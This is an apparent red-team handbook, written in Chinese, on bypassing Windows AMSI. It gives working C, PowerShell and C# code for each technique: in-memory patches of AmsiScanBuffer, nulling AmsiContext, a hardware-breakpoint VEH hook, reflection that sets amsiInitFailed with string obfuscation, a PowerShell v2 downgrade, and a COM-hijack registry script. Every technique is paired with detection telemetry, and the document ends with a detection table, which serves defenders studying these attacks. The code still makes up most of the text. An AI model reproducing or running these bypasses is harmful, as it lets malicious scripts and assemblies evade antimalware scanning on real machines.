# AMSI Bypass Techniques — 完整代码模式手册

> 本文件为 `windows-av-evasion.md` §0 的伴生手册（补齐「详细代码模式/PowerShell/.NET」断链）。
> 覆盖 AMSI 各 bypass 的**原理 → 实现 → 检测侧对应点 → 实测判据**四段。
> 授权立场与检测侧配对纪律见 `refs/README.md`；`AMSI_ETW_BYPASS.md` 覆盖 AMSI+ETW 联合。

## 0. AMSI 工作流回顾（决定绕过点）

```
脚本/程序集 → amsi.dll!AmsiScanBuffer(IAmsiStream) → 供应商(Defender)引擎 → AMSI_RESULT
```

绕过点按「是否触碰代码完整性」分两类：
- **Patchless**（不改 `.text`）：改 `AmsiContext` 结构、改 `amsiInitFailed`、COM 重定向、HWBP。
- **Memory patch**（改 `.text`）：patch `AmsiScanBuffer` 首字节 `ret`。

---

## 1. Patchless — 修改 AmsiContext 指针

**原理**：`AmsiScanBuffer` 内部从 `HAMSICONTEXT` 解引用 context 结构，若 context 成员被改写为「空/无效」则提前返回 `S_OK`（视为干净），全程不 patch 代码。

```c
// 完整实现：Patchless AMSI——AmsiContext 指针置 NULL（数据补丁，非代码补丁）
// 定位原理：AmsiScanBuffer 前导扫描窗口内第一处 lea rcx,[rip+disp32] 装载的
// 即 AmsiContext 变量地址；反算目标地址后写 0。
// 版本敏感：不同 Windows 版本 amsi.dll 前导字节变化——按窗口扫描而非硬编码偏移；
// 命中后回读验证（真实零值 ≠ 原值才算成功）。
int amsi_ctx_null(void) {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return 1;
    BYTE* scan = (BYTE*)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!scan) return 2;

    for (int i = 0; i + 6 < 64; i++) {
        if (scan[i] == 0x48 && scan[i+1] == 0x8D && scan[i+2] == 0x0D) {
            /* lea rcx,[rip+disp32]：目标 = 下一条指令地址 + disp */
            int disp = *(int*)(scan + i + 3);
            BYTE* ctxPtr = scan + i + 7 + disp;      /* AmsiContext 变量地址 */
            DWORD old;
            if (!VirtualProtect(ctxPtr, 8, PAGE_READWRITE, &old)) return 3;
            SecureZeroMemory(ctxPtr, 8);             /* 置 NULL：扫描前校验失败即返 S_OK */
            VirtualProtect(ctxPtr, 8, old, &old);
            ULONG64 after = *(ULONG64*)ctxPtr;
            return after == 0 ? 0 : 4;               /* 回读验证 */
        }
    }
    return 5;                                        /* 未定位：版本前导变化 */
}
```

**PowerShell 反射等价**（改 `amsiInitFailed` 标志，让 AMSI 初始化「假装失败」）：

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
  GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**检测侧**：AmsiContext 完整性校验（EDR 比对 context 结构指针合法性）；AMSI 会话遥测显示「scan skipped」异常。
**实测判据**：`AmsiInitialize` 成功但后续 `AmsiScanBuffer` 从不真正调用供应商引擎。

---

## 2. Memory Patch — AmsiScanBuffer 完整寻址

**原理**：定位 `amsi.dll!AmsiScanBuffer` 地址，把前几个字节 patch 成 `mov eax, AMSI_RESULT_CLEAN(0); ret`，使所有扫描返回干净。

```c
// 完整寻址 + patch（x64）
HMODULE hAmsi = LoadLibraryA("amsi.dll");
LPVOID pScan = GetProcAddress(hAmsi, "AmsiScanBuffer");

// patch 字节：x64 下常见做法
//  B8 00 00 00 00   mov eax, 0        (S_OK / AMSI_RESULT_CLEAN)
//  C3               ret
BYTE patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };

DWORD old;
VirtualProtect(pScan, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
memcpy(pScan, patch, sizeof(patch));
VirtualProtect(pScan, sizeof(patch), old, &old);
FlushInstructionCache(GetCurrentProcess(), pScan, sizeof(patch));
```

**硬编码偏移变体（跨版本不稳定，仅作研究参考——完整实现如下）**：

```c
// AmsiScanBufferInternal 内偏移 patch（研究参考）：先特征定位再 patch，
// 偏移只作为特征匹配的起点锚，不直接硬编码最终地址。
// 目标模式（x64）：40 53 48 83 EC 20（push rbx; sub rsp,0x20）→ 内部校验区
// patch 为：xor eax,eax; ret（跳过后续扫描逻辑，返回 S_OK）
int amsi_internal_patch(void) {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    BYTE* scan = (BYTE*)GetProcAddress(hAmsi, "AmsiScanBuffer");
    /* 特征匹配：在函数体 0x40 窗口内找「cmp + jz 扫描短路」前导，版本间漂移
     * 由窗口扫描吸收；匹配失败即放弃（不硬写未知偏移） */
    static const BYTE sig[] = { 0x48, 0x8B, 0x4C, 0x24, 0x30 };  /* 例：mov rcx,[rsp+30] */
    for (int i = 0; i + sizeof(sig) < 0x40; i++) {
        if (memcmp(scan + i, sig, sizeof(sig)) == 0) {
            BYTE patch[] = { 0x33, 0xC0, 0xC3 };  /* xor eax,eax; ret */
            DWORD old;
            if (!VirtualProtect(scan + i, sizeof(patch), PAGE_EXECUTE_READWRITE, &old)) return 1;
            memcpy(scan + i, patch, sizeof(patch));
            VirtualProtect(scan + i, sizeof(patch), old, &old);
            FlushInstructionCache(GetCurrentProcess(), scan + i, sizeof(patch));
            return 0;
        }
    }
    return 2;  /* 特征未命中：版本过新，改走 patchless 路线 */
}
```

**检测侧**：`amsi.dll!AmsiScanBuffer` 首字节 ≠ 磁盘映像（内存完整性校验）；EDR 周期性重扫 AMSI 函数。
**实测判据**：`AmsiScanBuffer` 内存首字节为 `B8 00 00 00 00 C3`，而磁盘为正常序言。

---

## 3. COM 劫持 — AMSI COM Server 重定向

**原理**：AMSI 通过 COM 接口（`IAmsiStream`/`IAntimalwareProvider`）调用；在 HKCU 注册表把 AMSI 的 COM CLSID 重定向到攻击者实现（返回干净结果），或改 `InprocServer32` 指向伪造 DLL。

```powershell
# 完整实现：COM 劫持（HKCU 优先于 HKLM 的 COM 解析顺序）
# AMSI 相关 COM 对象在 HKLM\SOFTWARE\Classes\CLSID\{...}\InprocServer32
# 在 HKCU 下写同名 CLSID + InprocServer32 指向攻击 DLL（返回干净的伪 AMSI provider）
# CLSID 按目标 Windows 版本核实（下列为研究参考形态，写入前 reg query 实测）：
#   注意：AMSI COM 劫持要求重启调用进程或 COM 缓存失效才生效，且新版 Windows
#   对 AMSI CLSID 加载路径有校验——本路线优先级低于 patchless/HWBP。

$clsid = '00000000-0000-0000-0000-000000000000'   # 替换为实测 AMSI COM CLSID
$hkcu = "HKCU:\SOFTWARE\Classes\CLSID\$clsid"
New-Item -Path $hkcu -Force | Out-Null
New-Item -Path "$hkcu\InprocServer32" -Force | Out-Null
Set-ItemProperty -Path "$hkcu\InprocServer32" -Name '(default)' -Value 'C:\path\to\fake-amsi-provider.dll'
Set-ItemProperty -Path "$hkcu\InprocServer32" -Name 'ThreadingModel' -Value 'Apartment'
# 伪造 DLL 实现 IAntimalwareProvider（返回 AMSI_RESULT_CLEAN），导出 DllGetClassObject/DllCanUnloadNow
# 验证：reg query HKCU\SOFTWARE\Classes\CLSID\$clsid\InprocServer32
# 回退：Remove-Item -Recurse $hkcu
```

**检测侧**：注册表 CLSID `InprocServer32` 被改 + 异常 DLL 加载（Sysmon 7/12/13）；AMSI COM 加载路径校验。
**实测判据**：AMSI 初始化加载的 DLL 路径指向用户目录而非 `System32\amsi.dll`。

---

## 4. Hardware Breakpoint — DR0-DR7 + VEH

**原理**：在 `AmsiScanBuffer` 设硬件断点（DR0=地址，DR7 使能），VEH 捕获异常后改 `rax` 返回 `AMSI_RESULT_CLEAN`，不改任何代码字节。

```c
// 完整实现：HWBP 绕过（短路式——VEH 改返回值并直跳返回地址）
// 关键语义：Dr 断点与 TF 单步都投递 EXCEPTION_SINGLE_STEP，先按 Rip 区分命中目标；
// 断点命中时指令未执行，必须手动推进 RIP（或摘点+单步+重挂，见 lab/06 mode 1）。
static ULONG64 g_scan_addr = 0;

LONG WINAPI VEH(PEXCEPTION_POINTERS ep) {
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;
    ep->ContextRecord->Dr6 = 0;                       // 清断点状态位
    if (ep->ContextRecord->Rip == g_scan_addr) {
        ep->ContextRecord->Rax = 0;                   // AMSI_RESULT_CLEAN / S_OK
        ULONG64* result = (ULONG64*)*(ULONG64*)(ep->ContextRecord->Rsp + 0x30);
        if (result) *result = 0;                      // 第 6 参 AMSI_RESULT* 置 CLEAN
        ep->ContextRecord->Rip = *(ULONG64*)(ep->ContextRecord->Rsp);  // 直跳 ret 地址
        ep->ContextRecord->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;                 // 纯 TF 单步：外抛
}

int hwbp_arm(BYTE* pScan) {
    g_scan_addr = (ULONG64)pScan;
    AddVectoredExceptionHandler(1, VEH);
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS | CONTEXT_CONTROL;
    GetThreadContext(GetCurrentThread(), &ctx);
    ctx.Dr0 = (DWORD64)pScan;                         // 断点地址 = AmsiScanBuffer
    ctx.Dr7 = (ctx.Dr7 & ~0x3) | 0x1;                 // 使能 DR0 局部断点（RW=执行，LEN=1B）
    SetThreadContext(GetCurrentThread(), &ctx);
    return 0;
}
// 收尾摘除：Dr7 &= ~0x1 后 SetThreadContext（悬挂断点在进程存活期间是持续检测面）
```

**检测侧**：线程调试寄存器 DR0-DR3 被设 + VEH 链异常（EDR 检测调试寄存器使用与异常处理改写）。
**实测判据**：`AmsiScanBuffer` 命中硬件断点且 VEH 改写返回值；`GetThreadContext` 显示 DR 寄存器非零。

---

## 5. PowerShell 专用 AMSI Bypass

### 5.1 PS v2 降级（无 AMSI）

```powershell
powershell -Version 2        # .NET 2.0 环境，PSv2 无 AMSI 集成
```

### 5.2 反射关闭（多版本通用族）

```powershell
# 反射改 amsiInitFailed（最常用）
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
  GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 变体：改 amsiContext 为 null
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
  GetField('amsiContext','NonPublic,Static').SetValue($null,$null)
```

### 5.3 字符串混淆触发词（避免静态命中 bypass 代码本身）

```powershell
$w = "Amsi" + "Utils"      # 拼接，规避「AmsiUtils」明文
$t = [Ref].Assembly.GetType("System.Management.Automation." + $w)
$t.GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)
```

**检测侧**：PowerShell 日志（4104 script block）中出现反射改 AMSI 字段的模式；EDR 监控 `amsiInitFailed` 访问。
**实测判据**：`AmsiUtils.amsiInitFailed` 被反射写入 `$true`；后续恶意脚本不再触发 AMSI 扫描。

---

## 6. .NET AMSI Bypass

**原理**：.NET 程序集加载也走 AMSI；绕过方式与 PowerShell 同源（反射改 `amsiInitFailed`），或 patch `AmsiScanBuffer`。

```csharp
// C# 反射改 amsiInitFailed（.NET）
var amsi = Type.GetType("System.Management.Automation.AmsiUtils, System.Management.Automation");
var field = amsi?.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
field?.SetValue(null, true);
```

```csharp
// C# patch AmsiScanBuffer（.NET，P/Invoke）
[DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, uint s, uint p, out uint o);
var addr = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer");
VirtualProtect(addr, 6, 0x40, out _);
Marshal.Copy(new byte[] { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 }, 0, addr, 6);
```

**检测侧**：.NET 运行时加载前 AMSI 函数被 patch（与 PowerShell 同源的完整性校验）；ETW 的 .NET 加载事件缺失。
**实测判据**：`Assembly.Load` 恶意程序集时 AMSI 无扫描调用。

---

## 检测侧总表（回馈 attack-defense）

| 绕过方法 | 检测点 | 遥测/Sigma |
|---|---|---|
| Patchless（context/initFailed） | AmsiContext 完整性 + scan skipped | AMSI 会话遥测 |
| Memory patch | AmsiScanBuffer 首字节 ≠ 磁盘 | 内存完整性 + YARA `amsi-bypass-001` |
| COM 劫持 | CLSID InprocServer32 异常 | Sysmon 12/13 + 加载路径校验 |
| HWBP | DR0-DR3 非零 + VEH | 调试寄存器遥测 |
| PS v2 降级 | PowerShell 版本异常 | 4104 + 进程命令行 |
| PS 反射 | amsiInitFailed 反射写 | PowerShell 日志 + EDR |
| .NET 反射 | AMSI 初始化标志异常 | ETW .NET 加载遥测 |

## 实测判据对照

| 判据 | 判定方法 |
|---|---|
| AMSI 是否真正被绕过 | 投递已知恶意样本/字符串，观察供应商引擎是否被调用（可用 ETW/调试器断点） |
| 是否被检测 | EDR 完整性校验是否告警 `amsi.dll`/`AmsiScanBuffer` 漂移 |

*WARNING: 授权红队评估与安全研究专用。*
